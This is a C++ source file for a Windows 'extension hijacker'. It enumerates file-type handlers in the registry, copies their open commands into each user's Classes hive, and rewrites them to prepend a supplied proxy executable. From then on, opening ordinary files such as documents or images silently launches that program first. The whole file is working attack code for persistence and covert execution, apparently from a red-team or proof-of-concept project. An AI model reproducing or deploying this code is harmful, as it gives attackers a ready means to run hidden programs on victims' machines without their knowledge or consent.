#include "ext_hijacker.h"

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

std::string getValueString(HKEY baseKey, std::string subKey)
{
    HKEY commandKey = NULL;
    if (RegOpenKeyExA(baseKey, subKey.c_str(), 0, KEY_READ, &commandKey) != ERROR_SUCCESS) {
        return "";
    }
    char path_buffer[MAX_KEY_LENGTH];
    DWORD val_len = MAX_KEY_LENGTH;
    DWORD type;
    RegGetValueA(commandKey, NULL, 0, REG_SZ, &type, path_buffer, &val_len);
    RegCloseKey(commandKey);
    if (type != REG_SZ) return "";
    if (val_len == 0) return "";
    return path_buffer;
}

std::vector<std::string> get_subkeys(HKEY hKey) 
{
    std::vector<std::string> subkeys;

    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = { 0 };  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys=0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 
 
    DWORD i, retCode; 
    DWORD cchValue = MAX_VALUE_NAME; 
 
    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
 
    // Enumerate the subkeys, until RegEnumKeyEx fails.
    if (cSubKeys) {
        //printf( "\nNumber of subkeys: %d\n", cSubKeys);

        for (i = 0; i < cSubKeys; i++) { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) {
                subkeys.push_back(achKey);
            }
        }
    }
    return subkeys;
}

BOOL hijack_key(std::string subKey, std::string proxy_path)
{
    std::string commandKey = subKey + "\\shell\\open\\command";
    HKEY hHijackedKey = NULL;
    size_t changed = 0;
    if (RegOpenKeyExA(HKEY_USERS, commandKey.c_str(), 0, KEY_READ | KEY_WRITE, &hHijackedKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    char path_buffer[MAX_KEY_LENGTH];
    DWORD val_len = MAX_KEY_LENGTH;
    DWORD type;
    RegGetValueA(hHijackedKey, NULL, 0, REG_SZ, &type, path_buffer, &val_len);

    printf("[W]%s\n", path_buffer);
    if (strstr(path_buffer, proxy_path.c_str()) != NULL) {
        printf("Already hijacked!\n");
        RegCloseKey(hHijackedKey);
        return TRUE;
    }

    std::string hijacked = proxy_path + " " + std::string(path_buffer);
    printf("[H]%s\n\n", hijacked.c_str());

    if (RegSetValueExA(hHijackedKey, NULL, 0, REG_SZ, (const BYTE*) hijacked.c_str(), hijacked.length()) != ERROR_SUCCESS) {
        RegCloseKey(hHijackedKey);
        return FALSE;
    }
    return TRUE;
}

bool copy_key(HKEY srcBaseKey, HKEY dstBaseKey, std::string subKey)
{
    bool is_success = FALSE;

    size_t changed = 0;
    printf("+%s\n", subKey.c_str());

    //
    HKEY commandKey = NULL;
    if (RegOpenKeyExA(srcBaseKey, subKey.c_str(), 0, KEY_READ, &commandKey) != ERROR_SUCCESS) {
        return false;
    }
    BYTE path_buffer[MAX_KEY_LENGTH];
    DWORD val_len = MAX_KEY_LENGTH;
    DWORD type;//RRF_RT_ANY
    RegGetValueA(commandKey, NULL, 0, RRF_RT_ANY, &type, path_buffer, &val_len);
    if (val_len == 0) {
        RegCloseKey(commandKey);
        printf("Reading source failed\n");
        return false;
    }
    RegCloseKey(commandKey);

    HKEY hDstKey = NULL;
    if (RegCreateKey(dstBaseKey, subKey.c_str(), &hDstKey) != ERROR_SUCCESS) {
        return is_success;
    }
    if (RegSetValueExA(hDstKey, NULL, 0, type, path_buffer, val_len) == ERROR_SUCCESS) {
        is_success = true;
    }

    RegCloseKey(hDstKey);
    return is_success;
}

size_t hijackExtensions(std::string proxy_path)
{
    HKEY hTestKey = NULL;
    if (RegOpenKeyEx(HKEY_USERS, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
        return 0;
    }

    std::vector<std::string> subkeys = get_subkeys(hTestKey);
    RegCloseKey(hTestKey);
    hTestKey = NULL;
   
    size_t changed = 0;
    size_t hijacked = 0;

    std::vector<std::string>::iterator itr;
    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {

        HKEY innerKey1;
        if (RegOpenKeyExA(HKEY_USERS, itr->c_str(), 0, KEY_READ | KEY_WRITE, &innerKey1) != ERROR_SUCCESS) {
            continue;
        }

        std::string subKey = *itr;

        printf("[W] %s\n", subKey.c_str());

        std::vector<std::string> subkeys2 = get_subkeys(innerKey1);
        for (std::vector<std::string>::iterator itr2 = subkeys2.begin(); itr2 != subkeys2.end(); itr2++) {  
            std::string subKey2 = subKey + "\\" + *itr2;
            printf("> %s\n", subKey2.c_str());

            if (hijack_key(subKey2, proxy_path)) {
                hijacked++;
            }
        }

        RegCloseKey(innerKey1);
    }
    printf("Hijacked keys: %d\n", hijacked);
    return hijacked;
}

std::string getLocalClasses()
{
    HKEY hTestKey = NULL;
    if (RegOpenKeyEx(HKEY_USERS, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
        return 0;
    }

    std::vector<std::string> subkeys = get_subkeys(hTestKey);
    RegCloseKey(hTestKey);
    hTestKey = NULL;

    std::vector<std::string>::iterator itr;
    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {
        if (strstr(itr->c_str(), "_Classes") == NULL) {
            continue;
        }
        HKEY innerKey1;
        if (RegOpenKeyExA(HKEY_USERS, itr->c_str(), 0, KEY_READ | KEY_WRITE, &innerKey1) != ERROR_SUCCESS) {
            continue;
        }
        RegCloseKey(innerKey1);
        return *itr;
    }
    return "";
}

bool key_exist(HKEY baseKey, std::string subKey)
{
    HKEY res = NULL;
    bool exist = false;
    RegOpenKeyA(baseKey, subKey.c_str(), &res);
    if (res != NULL) {
        exist = true;
        RegCloseKey(res);
    }
    return exist;
}

std::set<std::string> getGlobalCommands()
{
    std::set<std::string> handlersSet;

    size_t keys = 0;
    HKEY hTestKey = NULL;
    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
        return handlersSet;
    }
    std::vector<std::string> subkeys = get_subkeys(hTestKey);
    RegCloseKey(hTestKey);

    std::vector<std::string>::iterator itr;
    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {
        if (itr->at(0) != '.') {
            continue;
        }
        //extension found!
        HKEY innerKey1;
        if (RegOpenKeyExA(HKEY_CLASSES_ROOT, itr->c_str(), 0, KEY_READ, &innerKey1) != ERROR_SUCCESS) {
            continue;
        }
        std::string ext = *itr;
        std::string handlerName = getValueString(HKEY_CLASSES_ROOT, ext);

        if (handlerName.length() == 0) continue;

       std::string path = getValueString(HKEY_CLASSES_ROOT, handlerName + "\\shell\\open\\command");
       if (path.length() == 0) continue;
       handlersSet.insert(handlerName);
    }
    return handlersSet;
}

bool rewrite_handler(HKEY localClassesKey, std::string handlerName)
{
    return copy_key(HKEY_CLASSES_ROOT, localClassesKey, handlerName + "\\shell\\open\\command");
}

bool is_blacklisted(std::string handlerName)
{
    if (handlerName == "exefile") return true;
    if (handlerName == "batfile") return true;
    if (handlerName == "cmdfile") return true;
    if (handlerName == "comfile") return true;
    return false;
}

size_t rewriteExtensions(std::string &local, std::set<std::string> &handlersSets)
{
    HKEY localClassesKey = NULL;
    if (RegOpenKeyExA(HKEY_USERS, local.c_str(), 0, KEY_READ | KEY_WRITE, &localClassesKey) != ERROR_SUCCESS) {
        return 0;
    }
    size_t added = 0;
    std::set<std::string>::iterator hItr;
    for (hItr = handlersSets.begin(); hItr != handlersSets.end(); hItr++) {
        std::string handlerName = *hItr;
        if (is_blacklisted(handlerName)) {
            continue;
        }
        if (!key_exist(localClassesKey, handlerName.c_str()) ) {
            if (rewrite_handler(localClassesKey, handlerName)) {
                added++;
            } else {
                printf("Failed\n");
            }
        } else {
            printf("Already exist: ");
            printf("%s\n", handlerName.c_str());
        }
    }
    RegCloseKey(localClassesKey);
    return added;
}